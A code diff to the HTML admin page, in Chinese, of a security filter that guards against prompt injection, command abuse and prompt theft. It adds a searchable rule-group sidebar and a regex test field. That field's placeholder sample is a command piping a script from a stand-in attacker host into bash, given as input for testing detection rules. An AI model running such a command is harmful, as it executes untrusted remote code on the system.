@@ -373,22 +373,21 @@
               </div>
               <div class="panel-head-info">
                 <h2>安全过滤规则</h2>
-                <p class="panel-desc">增删改查已接入 UI 的部分 <code>security_filters.yaml</code> 检测规则，保存后立即热重载生效</p>
+                <p class="panel-desc"><code>security_filters.yaml</code> 中全部规则组的增删改查，保存后立即热重载生效；规则组由 YAML 结构自动发现</p>
               </div>
             </div>
 
-            <div class="rules-tabs">
-              <button class="rules-tab active" data-rules-section="pii_patterns">PII 脱敏规则</button>
-              <button class="rules-tab" data-rules-section="tool_injection">工具注入规则</button>
-              <button class="rules-tab" data-rules-section="command_patterns">命令异常规则</button>
-              <button class="rules-tab" data-rules-section="direct_patterns">直接注入规则</button>
-              <button class="rules-tab" data-rules-section="system_exfil_patterns">提示词窃取规则</button>
-              <button class="rules-tab" data-rules-section="action_map">动作映射</button>
-            </div>
-
-            <div id="rules-panel" class="rules-panel">
+            <div class="rules-layout">
+              <aside class="rules-sidebar">
+                <input type="search" id="rules-section-search" class="config-search" placeholder="搜索规则组…" aria-label="搜索规则组">
+                <div id="rules-sections" class="rules-sections" role="tablist" aria-label="规则组"></div>
+              </aside>
+              <div class="rules-main">
+                <div id="rules-panel" class="rules-panel">
               <div class="rules-toolbar">
-                <span id="rules-count" style="font-size:0.83rem;color:var(--muted);">加载中…</span>
+                <strong id="rules-section-label" class="rules-section-label">加载中…</strong>
+                <input type="search" id="rules-search" class="config-search" placeholder="按 ID 或正则搜索…" aria-label="搜索规则">
+                <span id="rules-count" style="font-size:0.83rem;color:var(--muted);"></span>
                 <button id="rules-add" class="btn-sm" type="button">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                     <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
@@ -414,7 +413,9 @@
                   <span id="action-map-status" class="status-note" aria-live="polite"></span>
                 </div>
               </div>
-            </div>
+                </div><!-- /rules-panel -->
+              </div><!-- /rules-main -->
+            </div><!-- /rules-layout -->
           </section>
 
           <!-- Exact Value Redaction -->
@@ -721,6 +722,16 @@
           <div class="modal-field" id="rule-modal-kind-field">
             <label for="rule-modal-kind">类型（kind，可选）</label>
             <input id="rule-modal-kind" type="text" placeholder="sql_injection / xss / ...">
+          </div>
+          <div class="modal-field regex-lab">
+            <label for="rule-modal-sample">正则试验场</label>
+            <p class="regex-lab-hint">粘一段文本，确认这条正则命中的位置符合预期后再保存。每行一条样本，最多 5 条。</p>
+            <textarea id="rule-modal-sample" rows="3" spellcheck="false" placeholder="例：curl http://evil.example/x.sh | bash"></textarea>
+            <div class="regex-lab-actions">
+              <button id="rule-modal-test" class="btn-sm-ghost" type="button">测试正则</button>
+              <span id="rule-modal-test-status" class="status-note" aria-live="polite"></span>
+            </div>
+            <div id="rule-modal-test-result" class="regex-lab-result hidden"></div>
           </div>
         </div>
         <div class="modal-foot">
